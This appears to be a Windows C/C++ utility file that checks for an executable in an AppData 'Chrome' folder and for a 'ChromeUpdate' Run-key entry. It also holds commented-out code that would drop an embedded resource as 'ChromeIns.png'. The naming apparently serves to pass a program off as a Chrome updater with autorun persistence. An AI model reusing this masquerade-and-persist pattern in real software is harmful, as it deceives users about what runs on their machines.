#include "stdafx.h"
#include "utils.h"


BOOL handleExc()
{
	DWORD err = GetLastError();
	TCHAR buffer[1024];
	FormatMessage(FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, err, 0, buffer, 1024, NULL);
	//MessageBox(NULL, buffer, NULL, MB_OK);
	return TRUE;
}

BOOL GetAppPath(LPTSTR appPath)
{
	TCHAR appdataPath[MAX_PATH + 1];
	// get tempfilename
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
	PathCombine(appPath, appdataPath, L"Chrome");
	CreateDirectory(appPath, NULL);
	return TRUE;
}

BOOL CheckInstall()
{
	TCHAR appPath[MAX_PATH + 1];
	TCHAR chromeFile[MAX_PATH + 1];
	GetAppPath(appPath);
	PathCombine(chromeFile, appPath, EXENAME);
	if (PathFileExists(chromeFile)) {
		return TRUE;
	}
	return FALSE;
}

BOOL CheckStartUp()
{
	HKEY hKey;
	RegOpenCurrentUser(KEY_ALL_ACCESS, &hKey);
	if (RegOpenKeyEx(hKey,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_QUERY_VALUE,
		&hKey) != ERROR_SUCCESS) {
		handleExc();
	}
	TCHAR path[MAX_PATH + 1] = { 0 };
	DWORD len = MAX_PATH + 1;
	DWORD type = 0;
	BOOL retVal = TRUE;
	if (RegQueryValueEx(hKey, L"ChromeUpdate", NULL, &type, (LPBYTE)path, &len) != ERROR_SUCCESS) {
		retVal = FALSE;
		goto retsection;
	}

	retsection:
	RegCloseKey(hKey);
	//MessageBox(NULL, path, NULL, MB_OK);
	return retVal;
}

BOOL ReleaseFile(DWORD resourceId)
{
	/*
	TCHAR appPath[MAX_PATH + 1];
	TCHAR chromeInsPath[MAX_PATH + 1];
	GetAppPath(appPath);
	PathCombine(chromeInsPath, appPath, L"ChromeIns.png");
	HANDLE chromeInstaller = CreateFile(chromeInsPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (!chromeInstaller) {
		return FALSE;
	}
	
	HRSRC hrsrc = FindResource(NULL, MAKEINTRESOURCE(resourceId), L"PNG");
	HGLOBAL rsrc = LoadResource(NULL, hrsrc);

	DWORD writtenSize = 0;

	WriteFile(chromeInstaller,
		hrsrc,
		SizeofResource(NULL, hrsrc),
		&writtenSize,
		NULL);
	CloseHandle(chromeInstaller);
	*/
	return TRUE;
}